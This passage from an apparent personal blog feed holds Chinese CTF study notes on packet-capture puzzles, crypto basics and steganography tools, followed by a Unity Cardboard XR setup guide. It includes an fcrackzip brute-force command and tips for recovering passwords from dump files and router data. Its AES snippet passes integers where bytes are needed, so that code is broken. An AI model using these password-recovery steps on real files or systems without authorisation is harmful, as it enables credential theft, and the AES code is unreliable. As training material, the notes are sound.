title="3）MongoDB流量"></a>3）MongoDB流量</h4><p><strong>题目：</strong></p><p>一个名为mongodb.pcap的文件</p><p><strong>个人思路：</strong></p><p>仍然是用Wireshark打开之后，过滤MongoDB流量，直接搜索“ctfhub”，一个一个审计便能找到flag</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/7.png"></p><p><strong>研究学习：</strong></p><p>使用NoSQL进行文档存储，MongoDB使用类似于JSON的查询语法。</p><h4 id><a href="#" class="headerlink" title></a></h4><h4 id="4）Data（ICMP）"><a href="#4）Data（ICMP）" class="headerlink" title="4）Data（ICMP）"></a>4）Data（ICMP）</h4><p><strong>题目：</strong></p><p>ping 也可以携带数据 ？一个名为icmp_data.pcap的流量包</p><p><strong>个人思路：</strong></p><p>使用Wireshark打开，过滤ICMP流量，查看字符串，发现结尾有很多WWW……，搜索常见字符串无果，在翻动时发现每条流量的字符串中都有A<em>WWWW……的结构（只有</em>代表的字符改变），从头开始看，发现每条“reply”的字符构成“ctfhub{……}”，一个一个记录下来，得到flag。</p><p><a href="https://ramoor.github.io/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/8.png"><img src="https://ramoor.github.io/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/8.png"></a></p><p><strong>研究学习：</strong></p><ul><li><strong>ICMP</strong>（Internet Control Message Protocol，互联网控制消息协议）是一种网络层协议，主要用于在IP网络中传递控制和错误信息。它常用于网络设备之间的通信，帮助进行网络故障排除、错误报告和网络管理。</li></ul><blockquote><ul><li><strong>PING 地址时ICMP协议流程</strong></li></ul><p><strong>一、发起方发送 ICMP Echo Request</strong></p><p>当用户执行 <code>ping</code> 命令时（例如 <code>ping &lt;IP地址&gt;</code>），发起方（通常是本地主机）会执行以下操作：</p><ol><li><p><strong>构造 ICMP 数据包</strong>：</p><ul><li><p><strong>类型（Type）</strong>：设置为 <code>8</code>，表示 ICMP Echo Request。</p></li><li><p><strong>代码（Code）</strong>：设置为 <code>0</code>。</p></li><li><p><strong>校验和（Checksum）</strong>：计算 ICMP 数据包的校验和，用于数据完整性验证。</p></li><li><p><strong>标识符（Identifier）</strong>：通常是一个随机值，用于区分不同的 <code>ping</code> 请求。</p></li><li><p><strong>序列号（Sequence Number）</strong>：从 <code>0</code> 开始，每次发送递增，用于跟踪请求和响应的对应关系。</p></li><li><p><strong>数据部分</strong>：通常包含一些填充数据，如时间戳或随机字节，用于测量往返时间（RTT）。</p></li></ul></li><li><p><strong>封装到 IP 数据包</strong>：</p><ul><li><p>ICMP 数据包被封装到 IP 数据包中，目标地址是用户指定的 IP 地址。</p></li><li><p>IP 头部包含源 IP 地址（发起方的 IP）和目标 IP 地址（被 <code>ping</code> 的 IP）。</p></li></ul></li><li><p><strong>发送数据包</strong>：</p><ul><li>发起方通过网络接口将封装好的 IP 数据包发送到目标主机。</li></ul></li></ol></blockquote><blockquote><p><strong>二、目标主机接收 ICMP Echo Request</strong></p><p>目标主机收到 ICMP Echo Request 数据包后，会执行以下操作：</p><ol><li><p><strong>解析 ICMP 数据包</strong>：</p><ul><li><p>检查 ICMP 类型是否为 <code>8</code>（Echo Request）。</p></li><li><p>验证校验和是否正确，以确保数据完整性。</p></li></ul></li><li><p><strong>构造 ICMP Echo Reply</strong>：</p><ul><li><p><strong>类型（Type）</strong>：设置为 <code>0</code>，表示 ICMP Echo Reply。</p></li><li><p><strong>代码（Code）</strong>：设置为 <code>0</code>。</p></li><li><p><strong>校验和（Checksum）</strong>：重新计算校验和。</p></li><li><p><strong>标识符（Identifier）</strong>：保持与收到的 Echo Request 相同。</p></li><li><p><strong>序列号（Sequence Number）</strong>：保持与收到的 Echo Request 相同。</p></li><li><p><strong>数据部分</strong>：保持与收到的 Echo Request 的数据部分一致。</p></li></ul></li><li><p><strong>封装到 IP 数据包</strong>：</p><ul><li>将 ICMP Echo Reply 数据包封装到 IP 数据包中，目标地址是发起方的 IP 地址。</li></ul></li><li><p><strong>发送数据包</strong>：</p><ul><li>目标主机将封装好的 IP 数据包发送回发起方</li></ul></li></ol></blockquote><blockquote><p><strong>三、发起方接收 ICMP Echo Reply</strong></p><p>发起方收到 ICMP Echo Reply 数据包后，会执行以下操作：</p><ol><li><p><strong>解析 ICMP 数据包</strong>：</p><ul><li><p>检查 ICMP 类型是否为 <code>0</code>（Echo Reply）。</p></li><li><p>验证校验和是否正确。</p></li><li><p>检查标识符和序列号是否与之前发送的 Echo Request 匹配。</p></li></ul></li><li><p><strong>计算往返时间（RTT）</strong>：</p><ul><li>通过比较发送时间和接收时间，计算出数据包的往返时间（RTT），并显示在 <code>ping</code> 命令的输出中。</li></ul></li><li><p><strong>输出结果</strong>：</p><ul><li><p>如果成功收到 Echo Reply，<code>ping</code> 命令会输出类似以下内容：</p><p><code>Reply from &lt;目标IP&gt;: bytes=32 time=10ms TTL=64</code></p></li><li><p>如果在超时时间内未收到响应，会输出：</p><p><code>Request timed out.</code></p></li></ul></li></ol></blockquote><blockquote><p><strong>四、异常情况</strong></p><p>在某些情况下，<code>ping</code> 命令可能会收到其他类型的 ICMP 消息，例如：</p><ol><li><p><strong>目标不可达（Destination Unreachable）</strong>：</p><ul><li><p>如果目标主机不可达，中间路由器可能会发送 ICMP 类型 <code>3</code>（Destination Unreachable）消息，代码可能为：</p><ul><li><p><code>0</code>：网络不可达。</p></li><li><p><code>1</code>：主机不可达。</p></li><li><p><code>6</code>：目的网络未知。</p></li><li><p><code>7</code>：目的主机未知。</p></li></ul></li></ul></li><li><p><strong>超时（Time Exceeded）</strong>：</p><ul><li>如果数据包的 TTL（生存时间）耗尽，中间路由器会发送 ICMP 类型 <code>11</code>（Time Exceeded）消息，代码为 <code>0</code>（TTL 超时）。</li></ul></li></ol></blockquote><blockquote><ul><li><strong>ICMP 数据包结构</strong></li></ul><p>ICMP 数据包的结构如下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">0                   1                   2                   3<br><span class="hljs-section">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|     类型     |     代码      |          校验和           |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|        标识符        |       序列号        |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                      数据部分 ...</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br></code></pre></td></tr></table></figure></blockquote><h4 id="5-Length-ICMP"><a href="#5-Length-ICMP" class="headerlink" title="5) Length (ICMP)"></a>5) Length (ICMP)</h4><p><strong>题目：</strong></p><p>一个icmp_len.pcap文件</p><p><strong>个人思路：</strong></p><p>使用Wireshark打开，过滤ICMP流量，搜索常见字符串无果，再逐个审计，发现并没有直接的字符存在。联系题目<strong>lenth</strong>，发现每个Data的字符串长度都不一样，记录每个字符</p><p><a href="https://ramoor.github.io/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/9.png"><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/9.png"></a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">99</span> <span class="hljs-number">116</span> <span class="hljs-number">102</span> <span class="hljs-number">104</span> <span class="hljs-number">117</span> <span class="hljs-number">98</span> <span class="hljs-number">123</span> <span class="hljs-number">97</span> <span class="hljs-number">99</span> <span class="hljs-number">98</span> <span class="hljs-number">54</span> <span class="hljs-number">53</span> <span class="hljs-number">57</span> <span class="hljs-number">102</span> <span class="hljs-number">48</span> <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">125</span><br></code></pre></td></tr></table></figure><p>转换为ASCII字符,得到flag</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">ctfhub&#123;acb<span class="hljs-number">659f023</span>&#125;<br></code></pre></td></tr></table></figure><p><strong>研究学习：</strong></p><p>分析Data部分的长度可变，因而能够隐藏信息</p><h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><h4 id="6）LengthBinary-ICMP"><a href="#6）LengthBinary-ICMP" class="headerlink" title="6）LengthBinary (ICMP)"></a>6）LengthBinary (ICMP)</h4><p><strong>题目：</strong></p><p>ping 包的大小有些奇怪</p><p><strong>个人思路：</strong></p><p>用Wireshark打开，发现Data部分的长度不一，但只有两种长度，结合题目猜测，较长的Data部分代表1，较短的代表0，记录下来：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">011000110111010001100110011010000111010101100010011110110011000000110100011001010110011001100101011001000011000101100101001100000011010101111101<br></code></pre></td></tr></table></figure><p>转成字符串，便得到flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">04</span>efed1e05&#125;<br></code></pre></td></tr></table></figure><p><strong>研究学习：</strong></p><p>仍然是利用Data部分长度可变隐藏信息</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>假期CTF学习记录</title>
    <link href="/2025/01/15/%E5%81%87%E6%9C%9FCTF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/01/15/%E5%81%87%E6%9C%9FCTF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto："><a href="#Crypto：" class="headerlink" title="Crypto："></a>Crypto：</h1><h3 id="一、模运算"><a href="#一、模运算" class="headerlink" title="一、模运算"></a>一、模运算</h3><ul><li><strong>二项式定理</strong>：</li></ul><blockquote><span>$$ (x+y)^n=(^n_0)x^ny^0+(^n_1)x^{n-1}y^1+...+(^n_{n-1})x^1y^{n-1}+(^n_n)x^0y^n $$</span></blockquote><blockquote><p>针对<strong>RSA</strong>：$N&#x3D;p*q$</p><p>$x&#x3D;(ap+bq)^n&#x3D;(ap)^n+(bq)^n \mod n$</p></blockquote><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="二、AES"><a href="#二、AES" class="headerlink" title="二、AES"></a>二、AES</h3><p><strong>Python中的简单实现：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#实现AES</span><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><br><br>key        = <span class="hljs-string">b&#x27;\xc3,\\\xa6\xb5\x80^\x0c\xdb\x8d\xa5z*\xb6\xfe\\&#x27;</span><br>ciphertext =<span class="hljs-number">0x61646d696e3d54727565303030303030</span><span class="hljs-comment">#b&#x27;\xd1O\x14j\xa4+O\xb6\xa1\xc4\x08B)\x8f\x12\xdd&#x27;</span><br>iv=<span class="hljs-number">0x8b14b5d74ac2c280b443bbbed84ea8c2</span><br><span class="hljs-comment">#填充</span><br><span class="hljs-comment">#padded_data = pad(data, AES.block_size)</span><br><br><br>decipher=AES.new(key,AES.MODE_CBC,iv)<br>plaintext=decipher.decrypt(ciphertext)<br><br><span class="hljs-built_in">print</span>(plaintext)<br><br><span class="hljs-string">&quot;&quot;&quot; # 解密需要使用相同的密钥和初始化向量 (IV)</span><br><span class="hljs-string">iv = cipher.iv  # 加密时生成的IV</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 创建解密器</span><br><span class="hljs-string">decipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 解密</span><br><span class="hljs-string">decrypted_data = unpad(decipher.decrypt(ciphertext), AES.block_size) &quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="三、工作模式（CBC-ECB-OFB-CFB-CTR）"><a href="#三、工作模式（CBC-ECB-OFB-CFB-CTR）" class="headerlink" title="三、工作模式（CBC,ECB,OFB,CFB,CTR）"></a>三、工作模式（CBC,ECB,OFB,CFB,CTR）</h3><ul><li><p>ECB不需要IV，需要短块处理</p></li><li><p>CBC需要短块处理</p></li><li><p>OFB，CFB，CTR是把明文转成密钥流与明文异或进行加密，因此没有短块问题</p></li></ul><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC:"></a>MISC:</h1><h3 id="一、图片题"><a href="#一、图片题" class="headerlink" title="一、图片题"></a>一、图片题</h3><ul><li><strong>LSB</strong>隐写</li></ul><blockquote><p>1、 利用Stegsolve低位通道解决</p></blockquote><blockquote><p>2、 <strong>带密码的LSB隐写：</strong> 在kali中使用<strong>cloacked-pixel</strong>中分离出隐藏信息，命令如下：</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 lsb<span class="hljs-selector-class">.py</span> extract xxx<span class="hljs-selector-class">.png</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span> <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><ul><li><p>隐含<strong>文件</strong>，利用<strong>binwalk</strong>查看是否存在隐含文件，再利用<strong>dd</strong>指令或<strong>forecast</strong>指令来分离出隐藏的文件</p></li><li><p>另一种图片隐含<strong>文件</strong>，利用<strong>steghide</strong>分离隐藏的文件</p></li></ul><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>steghide extract -sf xx.jpg<br></code></pre></td></tr></table></figure><ul><li><p><strong>exif</strong>隐写，在kali中使用<strong>exiftool</strong>工具提取隐藏信息</p></li><li><p><strong>F5</strong>隐写，kali环境中使用F5-steganography-master</p></li><li><p><strong>CRC</strong>校验（有可能出现zlib），在010Editor中找到CRC，使用脚本计算正确的<strong>宽度</strong>和<strong>高度</strong></p></li><li><p><strong>gif</strong>动图：</p></li></ul><blockquote><p>一、47 49 46 38开头</p><p>二、放进Stegsolve中提取每帧动画</p></blockquote><h3 id="二、流量分析"><a href="#二、流量分析" class="headerlink" title="二、流量分析"></a>二、流量分析</h3><ul><li>利用<strong>WireShark</strong>分析流量包，再对详细数据进行过滤</li></ul><blockquote><p>http POST&#x2F;GET 等</p></blockquote><ul><li><p>分析关于<strong>TCP</strong>的流量包，使用<strong>WireShark</strong>中的TCP流量追踪</p></li><li><p>寻找<strong>用户密码</strong>，需要找到**.dmp**文件名</p></li></ul><blockquote><p>（*dmp文件是windows系统中的错误转储文件，当Windows发生错误蓝屏的时候，系统将当前内存【含虚拟内存】中的数据直接写到文件中去，方便定位故障原因。）</p></blockquote><blockquote><p>（*里面包含主机用户密码信息）</p></blockquote><ul><li>对于<strong>USB</strong>流量包，使用<strong>UsbKeyboardDataHacker</strong>脚本提取内容</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> UsbKeyboardDataHacker.<span class="hljs-keyword">py</span> --<span class="hljs-built_in">input</span> xxx.pcap<br></code></pre></td></tr></table></figure><ul><li><strong>宽带数据泄露</strong>，使用<strong>RoutePassView</strong>查找用户名或密码</li></ul><h3 id="三、压缩文件"><a href="#三、压缩文件" class="headerlink" title="三、压缩文件"></a>三、压缩文件</h3><ul><li>密码<strong>爆破</strong></li></ul><blockquote><p><strong>Kali</strong>中：使用<strong>fcrackzip</strong>工具（ZIP压缩文件）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fcrackzip</span> -b -c <span class="hljs-number">1</span> -l <span class="hljs-number">4</span>-<span class="hljs-number">5</span> -u xxx.png  <br></code></pre></td></tr></table></figure><p><strong>Windows</strong>中：使用<strong>ARCHPR</strong>工具（ZIP，RAR等压缩文件）</p></blockquote><ul><li><strong>CRC</strong>爆破：</li></ul><blockquote><p>使用py脚本爆破</p></blockquote><ul><li>伪加密（ZIP）：</li></ul><p><strong>a.压缩源文件数据区：</strong></p><blockquote><p>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>09 00：全局方式位标记 （<strong>有无加密</strong>）<br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 64：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>00 00：扩展记录长度</p></blockquote><p><strong>b.压缩源文件目录区:</strong></p><blockquote><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>1F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>09 00：全局方式位标记（<strong>是否是加密</strong>）<br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 65：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p></blockquote><p><strong>c.压缩源文件目录结束标志:</strong></p><blockquote><p>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>5A 00 00 00：目录区尺寸大小<br>3F 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 00：ZIP 文件注释长度</p></blockquote><ul><li>伪加密（RAR）</li></ul><blockquote><p>结构如下<br>RAR 5.0签名由8个字节组成:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00<br>比较一下<br>RAR 4.x 签名由7字节组成:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x00</p></blockquote><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tap">D5<span class="hljs-number"> 56 </span>：HEAD_CRC，2字节，也就是文件头部分的crc校验值<br>74 ：HEAD_TYPE，1字节，块类型，74表示块类型是文件头<br>20<span class="hljs-number"> 90 </span>：HEAD_FLAGS，2字节，位标记，这块在资料上没找到对应的数值，不知道20 90代表什么意思。<br>2D<span class="hljs-number"> 00 </span>：HEAD_SIZE，2字节，文件头的全部大小（包含文件名和注释）<br>10<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>：PACK_SIZE，4字节，已压缩文件大小<br>10<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>：UNP_SIZE，4字节，未压缩文件大小<br>02：HOST_OS，1字节，保存压缩文件使用的操作系统，02代表windows<br>C7<span class="hljs-number"> 88 </span>67 36：FILE_CRC，4字节，文件的CRC值<br>6D BB 4E 4B ：FTIME，4字节，MS DOS 标准格式的日期和时间<br>1D：UNP_VER，1字节，解压文件所需要的最低RAR版本<br>30：METHOD，1字节，压缩方式，这里是存储压缩<br>08<span class="hljs-number"> 00 </span>：NAME_SIZE，2字节，表示文件名大小，这里文件名大小是8字节（flag.txt）<br>20<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>：ATTR，4字节，表示文件属性这里是txt文件<br>66 6C<span class="hljs-number"> 61 </span>67 2E<span class="hljs-number"> 74 </span>78 74：FILE_NAME（文件名） ，NAME_SIZE字节大小，这里NAME_SIZE大小为8<br>再往后是txt文件内容，一直到第六行<span class="hljs-number"> 65 </span>结束，下面是另一个文件块的开始<br><br>这个块中存在两个crc值，一个是文件头块中从块类型到文件名这38个字节的校验，后一个则是压缩包中所包含文件的crc校验，解压时，会计算解压后生成文件的crc值，如果等于这里的crc，则解压完成，如果不同，则报错中断。<br></code></pre></td></tr></table></figure><blockquote><ol><li><p>找到第24个字节，该字节尾数为4表</p></li><li><p>示加密，0表示无加密，将尾数改为0即可破解伪加密.</p></li></ol></blockquote><h3 id="四、音频题"><a href="#四、音频题" class="headerlink" title="四、音频题"></a>四、音频题</h3><ul><li><p>将<strong>MAV</strong>等音频文件放入<strong>Audacity</strong>中分析，如摩斯电码</p></li><li><p>将<strong>MAV</strong>等音频文件放入<strong>dtmf2num</strong>中分析（<strong>电话数字号码</strong>），代码如下：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./dtmf2num.exe girlfriend.wav<br></code></pre></td></tr></table></figure><h3 id="五、文档题"><a href="#五、文档题" class="headerlink" title="五、文档题"></a>五、文档题</h3><ul><li>Txt文档<strong>ntfs隐写</strong>：</li></ul><p>1】在隐写文档的目录下打开cmd命令行，输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">notepad</span> <span class="hljs-number">1</span>.txt:flag.txt<br></code></pre></td></tr></table></figure><p>2】在<strong>ntfsstreamseditor</strong>中扫描，尽量使用<strong>Winrar解压</strong></p><blockquote><p>出现<strong>pyc</strong>文件的话：使用<strong>uncompyle</strong>反汇编</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">uncompyle6 xxx<span class="hljs-selector-class">.pyc</span> &gt; <span class="hljs-selector-tag">main</span>.py<br></code></pre></td></tr></table></figure><p><strong>或</strong></p><p>在线工具反编译</p></blockquote><ul><li>Docx文档隐写：在文件-&gt;选项-&gt;显示-&gt;选中显示隐藏文字</li></ul><h3 id="六、视频题"><a href="#六、视频题" class="headerlink" title="六、视频题"></a>六、视频题</h3><ul><li>使用<strong>Kinovea</strong>打开视频文件（要求视频文件的路径上没有中文），进行每帧分析</li></ul><h3 id="七、镜像文件"><a href="#七、镜像文件" class="headerlink" title="七、镜像文件"></a>七、镜像文件</h3><ul><li>在<strong>Kali</strong>中用<strong>Foremost</strong>分离</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>很可惜，寒假里总是有种种不可避免的事，因此学到的内容有限，但我也有很多收获，只能说，2025继续努力！！</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unity3D</title>
    <link href="/2024/12/04/Unity3D/"/>
    <url>/2024/12/04/Unity3D/</url>
    
    <content type="html"><![CDATA[<h1 id="Unity-Cardboard-XR应用部署（以华为手机为例）"><a href="#Unity-Cardboard-XR应用部署（以华为手机为例）" class="headerlink" title="Unity Cardboard XR应用部署（以华为手机为例）"></a>Unity Cardboard XR应用部署（以华为手机为例）</h1><h2 id="1、创建项目"><a href="#1、创建项目" class="headerlink" title="1、创建项目"></a>1、创建项目</h2><p>我这里使用的版本是2022，需要添加Android模块，可通过下图方式添加。</p><p><img src="/2024/12/04/Unity3D/1.png"></p><p>接下来创建3D项目.</p><h2 id="2、导入Unity-SDK"><a href="#2、导入Unity-SDK" class="headerlink" title="2、导入Unity SDK"></a>2、导入Unity SDK</h2><blockquote><ul><li><p>在 Unity 中，前往 <strong>Window</strong>（窗口）&gt;<strong>Package Manager</strong>。</p></li><li><p>点击 <strong>+</strong>，然后选择 <strong>Add package from git URL</strong>。</p></li><li><p>将 <code>https://github.com/googlevr/cardboard-xr-plugin.git</code> 粘贴到文本中 输入字段。</p></li></ul></blockquote><ul><li><p>导入之前准备好的素材（直接拖入Unity的Project中即可）</p></li><li><p>若出现导入白模情况，解决方法如下</p></li></ul><p><img src="/2024/12/04/Unity3D/2.png"></p><ul><li>对<strong>Main camera</strong>添加<strong>Tracked Pose Driver</strong>组件。并在组件中的<strong>Tracking Type</strong>改为<strong>Rotation Only</strong>。</li></ul><h2 id="3、配置Android项目"><a href="#3、配置Android项目" class="headerlink" title="3、配置Android项目"></a>3、配置Android项目</h2><ul><li>在<strong>file</strong> -&gt; <strong>Build Settings</strong> 中选择Android -&gt; <strong>Switch Platform</strong>切换到Android平台</li></ul><p><img src="/2024/12/04/Unity3D/3.png"></p><ul><li><p>选择 <strong>Add Open Scenes</strong>，导入你的素材所在的场景。</p></li><li><p>接着配置<strong>Player Settings</strong></p></li></ul><blockquote><p>分辨率和呈现方式</p><ul><li><p>前往 <strong>Project Settings</strong> &gt;<strong>玩家</strong> &gt;<strong>分辨率和呈现方式</strong>。</p></li><li><p>将<strong>默认方向</strong>设置为<strong>横向向右</strong>。</p></li></ul><p><img src="/2024/12/04/Unity3D/4.png"></p><ul><li>停用<strong>Optimized Frame Pacing</strong>。(提高流畅度)</li></ul><p>其他设置</p><ul><li>设置API版本</li></ul><p><img src="/2024/12/04/Unity3D/5.png"></p><ul><li>设置Graphics  APIs</li></ul><p>取消勾选<strong>Auto Graphics API</strong>,然后选择<strong>OpenGLES2</strong>，接着将<strong>Color Space</strong>中选择<strong>Gamma</strong>，在<strong>Lightmap Encoding</strong>和<strong>HDR Cubemap Encoding</strong>中均改成<strong>Low Quality</strong>。如下图所示。</p><p><img src="/2024/12/04/Unity3D/6.png"></p><ul><li><strong>在gradle中添加依赖项</strong></li></ul><p>前往 <strong>Project Settings</strong> &gt;<strong>玩家</strong> &gt;<strong>发布设置</strong>。</p><ol><li>在 <strong>Build</strong> 部分中，选择 <code>Custom Main Gradle Template</code> 和 <code>Custom Gradle Properties Template</code>。</li><li>将以下代码行添加到 <code>Assets/Plugins/Android/mainTemplate.gradle</code>：</li></ol><blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">implementation</span> &#x27;androidx.appcompat:appcompat:<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">1</span>&#x27;  <br>  <span class="hljs-attribute">implementation</span> &#x27;com.google.android.gms:play-services-vision:<span class="hljs-number">20</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span>&#x27;  <br>  <span class="hljs-attribute">implementation</span> &#x27;com.google.android.material:material:<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">1</span>&#x27;  <br>  <span class="hljs-attribute">implementation</span> &#x27;com.google.protobuf:protobuf-javalite:<span class="hljs-number">3</span>.<span class="hljs-number">19</span>.<span class="hljs-number">4</span>&#x27;<br></code></pre></td></tr></table></figure></blockquote><p><img src="/2024/12/04/Unity3D/7.png"></p><p>3.将以下代码行添加到 <code>Assets/Plugins/Android/gradleTemplate.properties</code></p><blockquote><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">  <span class="hljs-attr">android.enableJetifier</span>=<span class="hljs-literal">true</span>  <br>  <span class="hljs-attr">android.useAndroidX</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure></blockquote><p><img src="/2024/12/04/Unity3D/8.png"></p><ul><li>前往 <strong>Project Settings</strong> &gt;<strong>XR 插件管理</strong>,选择 <strong>Plug-in Providers</strong>（插件提供程序）下的 <code>Cardboard XR Plugin</code>。</li></ul></blockquote><h2 id="4、部署到安卓手机"><a href="#4、部署到安卓手机" class="headerlink" title="4、部署到安卓手机"></a>4、部署到安卓手机</h2><p>在<strong>Build Settings</strong>中选择<strong>build</strong>生成apk并安装到手机查看效果，效果如下。</p><p><img src="/2024/12/04/Unity3D/9.png"></p>]]></content>
    
    
    <categories>
      
      <category>Deployment</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Unity</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto-题目复现</title>
